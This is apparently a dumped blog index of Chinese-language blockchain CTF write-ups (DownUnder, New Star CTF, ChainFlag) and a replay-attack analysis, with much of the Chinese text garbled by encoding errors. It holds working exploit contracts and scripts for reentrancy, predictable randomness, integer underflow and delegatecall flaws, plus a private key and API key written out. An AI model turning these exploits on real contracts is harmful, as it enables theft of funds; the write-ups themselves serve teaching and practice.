0152908401908201610312565b50505082870194505b50505094815260609390931b6001600160601b0319166020840152505060340192915050565b610394806103696000396000f3fe60806040526004361061004a5760003560e01c80631ac749ff1461004f57806323cfb56f146100775780637c46a9b014610081578063eb087bfb146100ae578063ecd424df146100c4575b600080fd5b34801561005b57600080fd5b5061006560015481565b60405190815260200160405180910390f35b61007f6100e4565b005b34801561008d57600080fd5b5061006561009c3660046101eb565b60046020526000908152604090205481565b3480156100ba57600080fd5b5061006560055481565b3480156100d057600080fd5b5061007f6100df366004610223565b61011e565b67016345785d8a000034116100f857600080fd5b33600090815260046020526040812080543492906101179084906102ee565b9091555050565b600083838360405160200161013593929190610315565b60405160208183030381529060405280519060200120905060055481146101985760405162461bcd60e51b81526020600482015260136024820152720a6dedacae8d0d2dccee640eee4dedcce40745606b1b604482015260640160405180910390fd5b6040514790339082156108fc029083906000818181858888f193505050501580156101c7573d6000803e3d6000fd5b505050505050565b80356001600160a01b03811681146101e657600080fd5b919050565b6000602082840312156101fd57600080fd5b610206826101cf565b9392505050565b634e487b7160e01b600052604160045260246000fd5b60008060006060848603121561023857600080fd5b833567ffffffffffffffff8082111561025057600080fd5b818601915086601f83011261026457600080fd5b8135818111156102765761027661020d565b604051601f8201601f19908116603f0116810190838211818310171561029e5761029e61020d565b816040528281528960208487010111156102b757600080fd5b826020860160208301376000602084830101528097505050505050602084013591506102e5604085016101cf565b90509250925092565b8082018082111561030f57634e487b7160e01b600052601160045260246000fd5b92915050565b6000845160005b81811015610336576020818801810151858301520161031c565b50919091019283525060601b6bffffffffffffffffffffffff1916602082015260340191905056fea2646970667358221220c558120b35ab560caa833f878d167e3c94af9005d6dea322262181580b0f895864736f6c634300081100330000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000dec0ded0000000000000000000000000000000000000000000000000000000000000022736f20616e79776179732069206a757374207374617274656420626c617374696e67000000000000000000000000000000000000000000000000000000000000\", \"nonce\": 1, \"to\": null, \"transactionIndex\": 1, \"value\": 0, \"type\": \"0x0\", \"chainId\": \"0x7a69\", \"v\": 62710, \"r\": \"0xcf50c8e0ed100baae3b31d69e45e7498caec66478e5ed9d884c3cedec6a14f82\", \"s\": \"0x73ebe87f3541c26669adf9ef18e665f47f1a30796f8f4b7162795099807f7e5a\"&#125;\n&#123;\"blockHash\": \"0xea9da20a3284e8019a0155369aafc875b3f23b649d69c05b7dd9c9880a8f2279\", \"blockNumber\": 4, \"from\": \"0x7BCF8A237e5d8900445C148FC2b119670807575b\", \"gas\": 42176, \"gasPrice\": 1000000000, \"hash\": \"0xbd0905bd8bd97e995a457e93871148170eb00c01b5e9c973933ceeff71e0f7ba\", \"input\": \"0x23cfb56f\", \"nonce\": 2, \"to\": \"0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8\", \"transactionIndex\": 0, \"value\": 10000000000000000000, \"type\": \"0x0\", \"chainId\": \"0x7a69\", \"v\": 62709, \"r\": \"0xa29e1e398ddeaf4291003f89249b7892449a6efe35c441d76f990016a5789735\", \"s\": \"0x4ac78cec2a1bc9f94859f0cfba83b1345ac5190641e91b4e6a3be7db41b72dc9\"&#125;\n\n0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000dec0ded0000000000000000000000000000000000000000000000000000000000000022736f20616e79776179732069206a757374207374617274656420626c617374696e67000000000000000000000000000000000000000000000000000000000000\nè¿™æ®µæ•°æ®åŒ…å«äº†éšæœºæ•°ä»¥åŠå­—ç¬¦ä¸²çš„ç»“æžœï¼Œé€šè¿‡åˆ†æžæˆ‘ä»¬ä¹Ÿå¯ä»¥èŽ·å¾—åˆçº¦éƒ¨ç½²çš„msg.senderï¼Œä¹‹åŽå°±å¯ä»¥è¿›è¡Œæ”»å‡»äº†\nAttack\ncontract test&#123;\n    function ret(string memory secret,uint secret_number,address _owner_address)public pure returns(bytes32)&#123;\n        bytes32 userHash = keccak256(abi.encodePacked(secret, secret_number, _owner_address));\n        return userHash;\n    &#125;\n&#125;\n// 0x2b8a95ae6adb40a4fd5a457e05a47225dff3b530f72e404ea8fb787a9bff6185\n// so anyways i just started blasting\n// 0xdec0ded\n// 0x7BCF8A237e5d8900445C148FC2b119670807575b\n\næµ‹è¯•ç»“æžœæ­£ç¡®ä¹‹åŽï¼Œä¾æ®å‚æ•°è°ƒç”¨ retrieveTheFundså‡½æ•°å³å¯\nCrypto Casinoç®€å•çš„éšæœºæ•°é—®é¢˜ï¼Œæ„Ÿè§‰å†™çš„æ–¹æ³•æœ‰äº›ç¬¨äº†ï¼Œåº”è¯¥æœ‰æ›´ç®€å•çš„è§£å†³æ–¹æ³•ï¼Œæš‚æ—¶æ²¡æœ‰åŽ»æƒ³\nCode//SPDX-License-Identifier: Unlicensed\npragma solidity ^0.8.0;\n\nimport \"OpenZeppelin/openzeppelin-contracts@4.3.2/contracts/token/ERC20/ERC20.sol\";\nimport \"OpenZeppelin/openzeppelin-contracts@4.3.2/contracts/access/Ownable.sol\";\n\ncontract DUCoin is ERC20, Ownable &#123;\n    constructor() ERC20(\"DUCoin\", \"DUC\") &#123;&#125;\n\n    function freeMoney(address addr) external onlyOwner &#123;\n        _mint(addr, 1337);\n    &#125;\n&#125;\n\n//SPDX-License-Identifier: Unlicensed\npragma solidity ^0.8.0;\n\nimport \"./DUCoin.sol\";\nimport \"OpenZeppelin/openzeppelin-contracts@4.3.2/contracts/access/Ownable.sol\";\n\ncontract Casino is Ownable &#123;\n    DUCoin public immutable ducoin;\n\n    bool trialed = false;\n    uint256 lastPlayed = 0;\n    mapping(address => uint256) public balances;\n\n    constructor(address token) &#123;\n        ducoin = DUCoin(token);\n    &#125;\n\n    function deposit(uint256 amount) external &#123;\n        ducoin.transferFrom(msg.sender, address(this), amount);\n        balances[msg.sender] += amount;\n    &#125;\n\n    function withdraw(uint256 amount) external &#123;\n        require(balances[msg.sender] >= amount, \"Insufficient balance!\");\n        ducoin.transfer(msg.sender, amount);\n        balances[msg.sender] -= amount;\n    &#125;\n\n    function _randomNumber() internal view returns(uint8) &#123;\n        uint256 ab = uint256(blockhash(block.number - 1));\n        uint256 a = ab &amp; 0xffffffff;\n        uint256 b = (ab >> 32) &amp; 0xffffffff;\n        uint256 x = uint256(blockhash(block.number));\n        return uint8((a * x + b) % 6);\n    &#125;\n\n    function play(uint256 bet) external &#123;\n        require(balances[msg.sender] >= bet, \"Insufficient balance!\");\n        require(block.number > lastPlayed, \"Too fast!\");\n        lastPlayed = block.number;\n\n        uint8 roll = _randomNumber();\n        if(roll == 0) &#123;\n            balances[msg.sender] += bet;\n        &#125; else &#123;\n            balances[msg.sender] -= bet;\n        &#125;\n    &#125;\n\n    function getTrialCoins() external &#123;\n        if(!trialed) &#123;\n            trialed = true;\n            ducoin.transfer(msg.sender, 7);\n        &#125;\n    &#125;\n&#125;\n\n\nAnalyseå…ˆèŽ·å¾—ç©ºæŠ•ï¼Œå†åŽ»ä¾æ®éšæœºæ•°è¿›è¡Œbetï¼Œç›´åˆ°ä½™é¢æ»¡è¶³è¦æ±‚å³å¯\nAttackcontract Attack&#123;\n    Casino public tar;\n    uint public balance;\n    uint8 public roll;\n    constructor(address _tar)public&#123;\n        tar=Casino(_tar);\n    &#125;\n    function _randomNumber() internal view returns(uint8) &#123;\n        uint256 ab = uint256(blockhash(block.number - 1));\n        uint256 a = ab &amp; 0xffffffff;\n        uint256 b = (ab >> 32) &amp; 0xffffffff;\n        uint256 x = uint256(blockhash(block.number));\n        return uint8((a * x + b) % 6);\n    &#125;\n    function step1(address Ier)public&#123;\n        tar.getTrialCoins();\n        balance+=7;\n        IERC20(Ier).approve(address(tar),0xffffffff);\n        tar.deposit(balance);\n    &#125;\n    function attack()public&#123;\n        roll = _randomNumber();\n        if(roll == 0) &#123;\n            tar.play(balance);\n            balance+=7;\n        &#125;\n\n    &#125;\n    // 0x9e5faafc\n    function step2(address Ier)public&#123;\n        tar.withdraw(1337);\n        IERC20(Ier).transfer(msg.sender,1337);\n    &#125;\n&#125;\n\nçº¯æ‰‹åŠ¨è°ƒç”¨å¤ªæ…¢äº†ï¼Œå†™ä¸ªpythonå¾ªçŽ¯è°ƒç”¨å§\nfrom web3 import Web3,HTTPProvider\nfrom web3.middleware import geth_poa_middleware\nimport binascii\nimport asyncio\n# w3 = Web3(HTTPProvider('https://mainnet.infura.io/v3/538e5cfe4f9a402cbc81eeb8205254ab'))\nw3 = Web3(HTTPProvider('https://blockchain-cryptocasino-fb03960225586b80-eth.2022.ductf.dev:443'))\nw3.middleware_onion.inject(geth_poa_middleware, layer=0)\n\n\nprivatekey='0x57af1bcf38ff8b9358493e7d502cdefd122376817565697f2ecc626dbf53c394'\naddress=w3.eth.account.from_key(privatekey).address\nprint(address)\n\nabi='''\nabi\n'''\ndef main():\n    contractadress='0xa1F8b18C09d0B7d848b6f56e424C455e9F5F1413'\n    contract=w3.eth.contract(abi=abi,address=contractadress)\n\n    txn_hash=contract.functions.attack().buildTransaction(&#123;\n        'from':address,\n        'nonce':w3.eth.getTransactionCount(address),\n        'gas':3000000,\n        'gasPrice': w3.toWei('21', 'gwei')\n    &#125;)\n    signed_txn=w3.eth.account.signTransaction(txn_hash,privatekey)\n    hash= w3.eth.sendRawTransaction(signed_txn.rawTransaction)\n    w3.eth.wait_for_transaction_receipt(hash)\n    print(hash.hex(),contract.functions.roll().call())\n\n\nfor i in range(0xffffffff):\n    main()\n\næš‚æ—¶è¿˜æ²¡æœ‰å®žçŽ°å…¨è§£ï¼Œå› ä¸ºé©¬ä¸Šè¦å¼€å­¦äº†ï¼Œæ—¶é—´æœ‰äº›ç´§å¼ ï¼Œè¿”æ ¡åŽåœ¨è§£å†³å‰©ä¸‹çš„ä¸¤é“é¢˜ç›®\n","slug":"DownUnder","date":"2022-10-11T15:34:16.219Z","categories_index":"","tags_index":"åŒºå—é“¾","author_index":"bcYng"},{"id":"addab9cb7f1208d8b87fb2ef53fe00a8","title":"New Star CTF","content":"New Star CTFé¢˜è§£ï¼Œèµ›é¢˜æš‚æœªæ›´æ–°å®Œ\n\n\nNew star ctfWeek31.Check inflag{Ea2y_B1ockChain_Ch3ckin}\n2.guess numberpragma solidity ^0.4.23;\n\ncontract guessnumber &#123;\n    mapping(address => uint) private answer;\n    address owner;\n    uint number;\n    \n    constructor()public&#123;\n        owner = msg.sender;\n    &#125;\n\n    event isSolved();\n\n    modifier onlyOwner()&#123;\n        require(msg.sender == owner);\n        _;\n    &#125;\n\n    function set_number(uint new_number) public onlyOwner&#123;\n        number=new_number;\n    &#125;\n\n    function guess(uint guess_number) public &#123;\n        answer[msg.sender]=guess_number;\n        if(answer[msg.sender]==number)&#123;\n            emit isSolved();\n        &#125;\n    &#125;\n&#125;\n\nå°±æ˜¯å˜é‡å­˜å‚¨ï¼Œå¯ä»¥å†™ä¸€ä¸ªè„šæœ¬çœ‹çœ‹ï¼Œä¹Ÿå¯ä»¥ç›´æŽ¥åŽ»åŒºå—é“¾æµè§ˆå™¨é‡Œè¾¹æŠ„åˆ«äººçš„\nflag{Wh4t_1s_th3_numb3r}\n3.the chosen onepragma solidity ^0.4.24;\n\ncontract choose &#123;\n    address owner;\n    \n    event isSolved();\n    \n    constructor() public&#123;\n    \towner = msg.sender;\n    &#125;\n    \n    function chooseone() public&#123;\n        require(uint(msg.sender) &amp; 0xffff==0xabcd);\n        owner = msg.sender;\n    &#125;\n\n    modifier onlyOwner() &#123;\n        require(msg.sender == owner);\n        _;\n    &#125;\n    \n    function getflag() onlyOwner &#123;\n        emit isSolved();\n    &#125;\n&#125;\n\n\nå°±æ˜¯è·‘æŒ‡å®šåŽç¼€çš„åœ°å€\nfrom tkinter import W\nfrom web3 import Web3,HTTPProvider\nimport random,string,blocksmith\nw3=Web3(HTTPProvider('https://goerli.infura.io/v3/538e5cfe4f9a402cbc81eeb8205254ab'))\n\ndef generate_random_str(randomlength=16):\n    string.digits='0123456789'\n    string.ascii_letters='abcdef'\n    str_list = [random.choice(string.digits + string.ascii_letters) for i in range(randomlength)]\n    random_str = ''.join(str_list)\n    return random_str\n\n\n\nfor i in range(0,0xfffff):\n    private_key=generate_random_str(64)\n    address=blocksmith.EthereumWallet.generate_address(private_key)\n    # print(address[39:])\n    if(address[38:]=='abcd'):\n        print(private_key,address)\n\nflag{Y0u_ar3_th3_ch00s3n_0n3}\nwee41.Demolition Truckspragma solidity ^0.4.23;\n\ncontract Trucks &#123;\n    constructor() public&#123;\n    &#125;\n\n    event isSolved();\n\n    function getBalance() public view returns (uint256)&#123;\n        return address(this).balance;  \n    &#125;\n\n    function payforflag() public returns (bool)&#123;\n        address _to = 0x498d4BAddD959314591Dc14cb10790e8Df68b1b1;\n        require(address(this).balance>0);\n        emit isSolved();\n        _to.transfer(address(this).balance);\n\n    &#125;\n&#125;\n\nè‡ªæ¯åˆçº¦å°±è¡Œäº†\nflag{1t_1s_a_pl3asant_c00p3rati0n}\n2.baby bankpragma solidity ^0.4.23;\n\ncontract Bank&#123;\n\tmapping (address => uint) public balance;\n    event Received(address Sender, uint Value);\n    event isSolved();\n    uint public chance;\n\t\n    constructor() public payable&#123;\n        chance = 1;\n    &#125;\n    \n    function() external payable &#123;\n        emit Received(msg.sender, msg.value);\n    &#125;\n\n    function gift() public &#123;\n        require(chance==1);\n        balance[msg.sender] = 2;\n        chance=0;\n    &#125;\n\n\tfunction withdraw(uint amount) public&#123;\n        require(amount==2);\n        require(balance[msg.sender] >= amount);\n        msg.sender.call.value(amount)();\n        balance[msg.sender] -= amount;\n    &#125;\n\n    function payforflag() public &#123;\n        require(balance[msg.sender] >= 10000000000);\n        balance[msg.sender]=0;\n        chance=1;\n        emit isSolved();\n        address _to = 0x498d4BAddD959314591Dc14cb10790e8Df68b1b1;\n        _to.transfer(address(this).balance);\n    &#125;\n\n&#125;\n\né‡å…¥\ncontract attack&#123;\n    Bank target;\n    helper help;\n    bool public flag;\n    constructor(address tar)public&#123;\n        target=Bank(tar);\n    &#125;\n    function()external payable&#123;\n        if(!flag)&#123;\n        target.withdraw(2);   \n        flag=!flag;\n        &#125;\n        \n    &#125;\n    function pwn()public &#123;\n        target.gift();\n        target.withdraw(2);\n    &#125;\n    function solve()public &#123;\n        target.payforflag();\n    &#125; \n&#125;\n\ncontract helper&#123;\n    constructor(address tar)public payable&#123;\n        selfdestruct(tar);\n    &#125;\n&#125;\n\n","slug":"New star ctf","date":"2022-10-11T15:34:05.637Z","categories_index":"","tags_index":"åŒºå—é“¾","author_index":"bcYng"},{"id":"02422efed6266c39f6caa487b5070e3c","title":"Replay attack","content":"ç®€å•çš„é‡æ”¾æ”»å‡»åˆ†æž\n\n\nReplay attack\nAnalyseCore codefunction transferProxy(address _from, address _to, uint256 _value, uint256 _fee,\n        uint8 _v,bytes32 _r, bytes32 _s) public transferAllowed(_from) returns (bool)&#123;\n\n        if(balances[_from] &lt; _fee + _value) revert();\n\n        uint256 nonce = nonces[_from];\n        bytes32 h = keccak256(_from,_to,_value,_fee,nonce);\n        if(_from != ecrecover(h,_v,_r,_s)) revert();\n\n        if(balances[_to] + _value &lt; balances[_to]\n            || balances[msg.sender] + _fee &lt; balances[msg.sender]) revert();\n        balances[_to] += _value;\n        Transfer(_from, _to, _value);\n\n        balances[msg.sender] += _fee;\n        Transfer(_from, msg.sender, _fee);\n\n        balances[_from] -= _value + _fee;\n        nonces[_from] = nonce + 1;\n        return true;\n    &#125;\n\nä¸ºè§£å†³gas feeé—®é¢˜ï¼Œåœ¨æ™ºèƒ½åˆçº¦ä¸­ä¼šé‡‡å–ä»£ç†è½¬è´¦åŠŸèƒ½ï¼Œå³TransferProxyã€‚æ¯”å¦‚åœ¨HXH tokenåˆçº¦ä¸­ï¼ŒAæƒ³è½¬è´¦300Tokenç»™Bï¼Œä½†æ˜¯ï¼ŒAæ²¡æœ‰è¶³å¤Ÿæ•°é‡çš„ETHç”¨æ¥æ”¯ä»˜Gas feeï¼ŒäºŽæ˜¯Aå¯ä»¥æ‰¾Cåšä¸­é—´äººï¼ŒAæ”¯ä»˜ä¸€å®šçš„tokenåšservice feeï¼Œè®©Cæ¥ä»£æ›¿Aä»˜å‡ºGas feeï¼Œæ ¸å¿ƒä»£ç å¦‚ä¸Š\nexampleï¼š\n&#123;\n  'from':address(A)\n  'to':address(B)\n\t'value':300\n\t'fee':10\n&#125;\n\nä¸Šè¿°äº‹ä¾‹æ‰§è¡Œç»“æžœä¸ºAæ”¯ä»˜310tokenï¼Œå…¶ä¸­300ä¸ªè½¬è´¦ç»™Bï¼Œ10ä¸ªåšä¸ºæ‰‹ç»­è´¹è½¬è´¦ç»™Cï¼ŒCèŽ·å¾—10tokenå¥–åŠ±ï¼Œæ¶ˆè€—ä¸€å®šçš„æ‰‹ç»­è´¹\nå‡½æ•°ä¸­çš„é‡ç‚¹æ˜¯keccak256ä»¥åŠecrecover\n\nè§’è‰²A(_from)å…ˆç”¨sha3å‡½æ•°å¯¹ _from,_to,_value,_fee,nonce,address(token)è¿›è¡Œå¤„ç†å¾—åˆ°msgå€¼ï¼Œç„¶åŽä½¿ç”¨web3.eth.sign(address, msg)å¾—åˆ°ç­¾åsignatureï¼›\nå°†signatureå–å‰ 066 ä¸ªå­—èŠ‚ä½œä¸º rï¼Œ 66130 ä¹‹é—´çš„å­—èŠ‚ä½œä¸º sï¼Œ130~132 çš„å­—èŠ‚ä½œä¸º vï¼Œç„¶åŽæŠŠ v è½¬ä¸ºæ•´åž‹ï¼Œè§’è‰²AæŠŠè¿™äº›ä¿¡æ¯å‘ŠçŸ¥è§’è‰²Cï¼Œè§’è‰²Cè°ƒç”¨åˆçº¦çš„transferProxyè¿›è¡Œè½¬è´¦ï¼›\nåˆçº¦å†…ecrecoveræŽ¥æ”¶ç­¾åæ•°æ®çš„å“ˆå¸Œå€¼ä»¥åŠ r&#x2F;s&#x2F;v ç­‰å‚æ•°ä½œä¸ºè¾“å…¥ï¼Œè¿”å›žå®žæ–½è¯¥ç­¾åçš„è´¦æˆ·åœ°å€ï¼›\næ ¡éªŒæ­¥éª¤3ä¸­å¾—åˆ°çš„è´¦æˆ·åœ°å€ä¸Ž _from æ˜¯å¦åŒ¹é…ï¼›\n\nlet msg = web3.sha3(_from,_to,_value,_fee,nonce,address(token))\nlet signature = web3.eth.sign(_from, msg)\n\nlet r = signature.slice(0, 66)\nlet s = '0x' + signature.slice(66, 130)\nlet v = '0x' + signature.slice(130, 132)\nv = web3.toDecimal(v)\n\nconsole.log('r', r)\nconsole.log('s', s)\nconsole.log('v', v)\nconsole.log(msg)\n\nå¦‚æžœåŒ¹é…åˆ™æ‰§è¡Œï¼Œå¦åˆ™revertï¼Œä½†æ˜¯åœ¨è®¸å¤šæ™ºèƒ½åˆçº¦ä¸­é‡‡å–äº†ç›¸åŒçš„ç­¾åæ–¹å¼ï¼Œå¯¼è‡´åŒä¸€ç¬”äº¤æ˜“å¯èƒ½åœ¨å¦ä¸€ä¸ªåˆçº¦ï¼ˆä¸‹æ–‡æˆ‘ä»¬è¯´ä¸ºFXH Tokenï¼‰ä¸­è¢«é‡æ”¾\næ¯”å¦‚ä¸Šè¿°äº‹ä¾‹ï¼Œåœ¨ä»¥å¤ªåŠæµè§ˆå™¨ä¸­äº¤æ˜“æ•°æ®å…¬å¼€é€æ˜Žï¼Œäº¤æ˜“çš„å‚æ•°å¯ä»¥è¢«æŸ¥è¯¢åˆ°ï¼Œæ­¤æ—¶å¦‚æžœBæ¸…æ¥šé‡æ”¾æ”»å‡»ï¼Œå°±å¯ä»¥èŽ·å–äº¤æ˜“æ•°æ®è¿›è¡Œæ”»å‡»ï¼Œæ”»å‡»æˆåŠŸçš„å‰ææ˜¯ _from è´¦æˆ·åœ¨ä¸¤ä¸ªåˆçº¦ä¸­çš„ nonce ï¼ˆä¸€èˆ¬åœ¨åˆçº¦ä¸­è‡ªå¢žï¼‰å€¼æ˜¯ä¸€æ ·çš„ï¼Œè¿™æ ·æ‰èƒ½ä¿è¯ç­¾ååŽçš„ hash å€¼ç›¸åŒã€‚åœ¨FXHåˆçº¦ä¸­æ‰§è¡Œç›¸åŒçš„äº¤æ˜“ï¼Œç›¸å½“äºŽAè½¬ç»™äº†è§’è‰²B 300HXHä¹‹åŽï¼Œåˆè½¬ç»™äº†è§’è‰²B 300FXHï¼ˆæœªæŽˆæƒçš„ï¼‰ï¼Œé€ æˆäº†æ„æ–™ä¹‹å¤–çš„æŸå¤±\né˜²å¾¡å»ºè®®\n\nnonce ç”Ÿæˆç®—æ³•ä¸é‡‡ç”¨ä»Ž 0 å¼€å§‹è‡ªå¢žçš„è®¾è®¡ï¼Œé¿å…å’Œåœºæ™¯çš„åšæ³•ç›¸åŒï¼›\nåŽ»é™¤ transferProxy å‡½æ•°ï¼Œæ”¹æˆå…¶ä»–æ–¹å¼å®žçŽ°ä»£ç†çš„éœ€æ±‚ï¼›\n\nOther related contracts\nM2C Mesh Network (mesh) 0x3AC6cb00f5a44712022a51fbace4C7497F56eE31\nM2C Mesh Network (MTC) 0x8feBf7551EeA6Ce499F96537Ae0e2075c5A7301a\nFirst (FST) 0x9E88770DA20ebea0Df87aD874c2F5cf8ab92f605\nGG Token (GG) 0xF20b76Ed9d5467fDcDc1444455e303257d2827c7\nUG Token (UGT) old 0x43ee79e379e7b78d871100ed696e803e7893b644\n\nå‚è€ƒï¼š[https://github.com/nkbai/defcon26/blob/master/docs/Replay%20Attacks%20on%20Ethereum%20Smart%20Contracts.md](https://github.com/nkbai/defcon26/blob/master/docs/Replay Attacks on Ethereum Smart Contracts.md)\n","slug":"Replay attack","date":"2022-10-11T15:32:03.303Z","categories_index":"","tags_index":"åŒºå—é“¾","author_index":"bcYng"},{"id":"d378808bbcd5d495f80cba891879084d","title":"Chain Flag","content":"Upgradingï¼ï¼\n\n\ninteger overflowbet\n\n\n\n\n\n\n\n\n0x30d0a604d8c90064a0a3ca4beeea177eff3e9bcd@ropsten\nhttps://github.com/chainflag/ctf-blockchain-challenges/tree/main/integer_overflow/bet/attachments\nCodepragma solidity ^0.4.24;\n\ncontract bet &#123;\n    uint secret;\n    address owner;\n    \n    mapping(address => uint) public balanceOf;\n    mapping(address => uint) public gift;\n    mapping(address => uint) public isbet;\n    \n    event SendFlag(string b64email);\n    \n    function Bet() public&#123;\n        owner = msg.sender;\n    &#125;\n    \n    function payforflag(string b64email) public &#123;\n        require(balanceOf[msg.sender] >= 100000);\n        balanceOf[msg.sender]=0;\n        owner.transfer(address(this).balance);\n        emit SendFlag(b64email);\n    &#125;\n    \n\n    //to fuck\n    \n    modifier only_owner() &#123;\n        require(msg.sender == owner);\n        _;\n    &#125;\n    \n    function setsecret(uint secretrcv) only_owner &#123;\n        secret=secretrcv;\n    &#125;\n    \n    function deposit() payable&#123;\n        uint geteth=msg.value/1000000000000000000;\n        balanceOf[msg.sender]+=geteth;\n    &#125;\n    \n    function profit() &#123;\n        require(gift[msg.sender]==0);\n        gift[msg.sender]=1;\n        balanceOf[msg.sender]+=1;\n    &#125;\n    \n    function betgame(uint secretguess)&#123;\n        require(balanceOf[msg.sender]>0);\n        balanceOf[msg.sender]-=1;\n        if (secretguess==secret)\n        &#123;\n            balanceOf[msg.sender]+=2;\n            isbet[msg.sender]=1;\n        &#125;\n    &#125;\n    \n    function doublebetgame(uint secretguess) only_owner&#123;\n        require(balanceOf[msg.sender]-2>0);\n        require(isbet[msg.sender]==1);\n        balanceOf[msg.sender]-=2;\n        if (secretguess==secret)\n        &#123;\n            balanceOf[msg.sender]+=2;\n        &#125;\n    &#125;\n\n&#125;\n\nAnalysesecretå¯æŽ§ï¼Œä¸‹æº¢\nhf\n\n\n\n\n\n\n\n\n0x62f1173e0fb4d481114d389dc8e0dea65e942735@ropsten\nhttps://github.com/chainflag/ctf-blockchain-challenges/tree/main/integer_overflow/hf/attachments\nCodepragma solidity ^0.4.24;\n\ncontract hf &#123;\n    address secret;\n    uint count;\n    address owner;\n    \n    mapping(address => uint) public balanceOf;\n    mapping(address => uint) public gift;\n    \n    struct node &#123;\n        address nodeadress;\n        uint nodenumber;\n    &#125;\n    \n    node public node0;\n    \n    event SendFlag(string b64email);\n    \n    constructor()public&#123;\n        owner = msg.sender;\n    &#125;\n    \n    function payforflag(string b64email) public &#123;\n        require(balanceOf[msg.sender] >= 100000);\n        balanceOf[msg.sender]=0;\n        owner.transfer(address(this).balance);\n        emit SendFlag(b64email);\n    &#125;\n    \n\n    //to fuck\n    \n    modifier onlySecret() &#123;\n        require(msg.sender == secret);\n        _;\n    &#125;\n    \n    function profit() public&#123;\n        require(gift[msg.sender]==0);\n        gift[msg.sender]=1;\n        balanceOf[msg.sender]+=1;\n    &#125;\n    \n    function hfvote() public payable&#123;\n        uint geteth=msg.value/1000000000000000000;\n        balanceOf[msg.sender]+=geteth;\n    &#125;\n    \n    function ubw() public payable&#123;\n        if (msg.value &lt; 2 ether)\n        &#123;\n            node storage n = node0;\n            n.nodeadress=msg.sender;\n            n.nodenumber=1;\n        &#125;\n        else\n        &#123;\n            n.nodeadress=msg.sender;\n            n.nodenumber=2;\n        &#125;\n    &#125;\n    \n    function fate(address to,uint value) public onlySecret &#123;\n        require(balanceOf[msg.sender]-value>=0);\n        balanceOf[msg.sender]-=value;\n        balanceOf[to]+=value;\n    &#125;\n    \n&#125;\n\nAnalyseç»“æž„ä½“æœªåˆå§‹åŒ–ï¼Œè¦†ç›–å˜é‡secretï¼Œä¸‹æº¢\ndelegatecallCounterstrike\n\n\n\n\n\n\n\n\nå‘çŽ°ä¸ªå¤§ç‚¸å¼¹ï¼Œå—ç´¯æŠŠå®ƒç”µæºå…³äº†ã€‚\nCodecontracts/EasyBomb.sol\npragma solidity ^0.5.10;\n\nimport \"./Launcher.sol\";\n\ncontract EasyBomb&#123;\n    bool private hasExplode = false;\n    address private launcher_address;\n    bytes32 private password;\n    bool public power_state = true;\n    bytes4 constant launcher_start_function_hash = bytes4(keccak256(\"setdeadline(uint256)\"));\n    Launcher launcher;\n\n    function msgPassword() public returns (bytes32 result)  &#123;\n        bytes memory msg_data = msg.data;\n        if (msg_data.length == 0) &#123;\n            return 0x0;\n        &#125;\n        assembly &#123;\n            result := mload(add(msg_data, add(0x20, 0x24)))\n        &#125;\n    &#125;\n\n    modifier isOwner()&#123;\n        require(msgPassword() == password);\n        require(msg.sender != tx.origin);\n        uint x;\n        assembly &#123; x := extcodesize(caller) &#125;\n        require(x == 0);\n        _;\n    &#125;\n\n    modifier notExplodeYet()&#123;\n        launcher = Launcher(launcher_address);\n        require(block.number &lt; launcher.deadline());\n        hasExplode = true;\n        _;\n    &#125;\n\n    constructor(address _launcher_address, bytes32 _fake_flag) public &#123;\n        launcher_address = _launcher_address;\n        password = _fake_flag ;\n    &#125;\n\n    function setCountDownTimer(uint256 _deadline) public isOwner notExplodeYet &#123;\n        launcher_address.delegatecall(abi.encodeWithSignature(\"setdeadline(uint256)\",_deadline));\n    &#125;\n&#125;\n\ncontracts/Setup.sol\npragma solidity ^0.5.10;\n\nimport \"./EasyBomb.sol\";\nimport \"./Launcher.sol\";\n\ncontract Setup &#123;\n    EasyBomb public easyBomb;\n\n    constructor(bytes32 _password) public &#123;\n        easyBomb = new EasyBomb(address(new Launcher()), _password);\n    &#125;\n\n    function isSolved() public view returns (bool) &#123;\n        return easyBomb.power_state() == false;\n    &#125;\n&#125;\n\ncontracts/Launcher.sol\npragma solidity ^0.5.10;\n\ncontract Launcher&#123;\n    uint256 public deadline;\n    function setdeadline(uint256 _deadline) public &#123;\n        deadline = _deadline;\n    &#125;\n\n    constructor() public &#123;\n        deadline = block.number + 100;\n    &#125;\n&#125;\n\nAnalyseé¢˜ç›®è¦æ±‚å…³æŽ‰ç‚¸å¼¹ï¼Œä¹Ÿå°±æ˜¯power_stateå˜é‡ä¸ºfalseï¼ŒEasyBombåˆçº¦åœ¨setCountDownTimerå‡½æ•°ä½¿ç”¨äº†delegatecallï¼Œè°ƒç”¨äº†launcheråˆçº¦çš„setdeadlineå‡½æ•°ï¼Œä¿®æ”¹slot0ä¸­çš„å˜é‡ï¼Œè€Œåœ¨EasyBombåˆçº¦ä¸­slot0å­˜å‚¨äº†hasExplodeçš„boolå˜é‡ä»¥åŠlauncher_addresså˜é‡ï¼Œå› 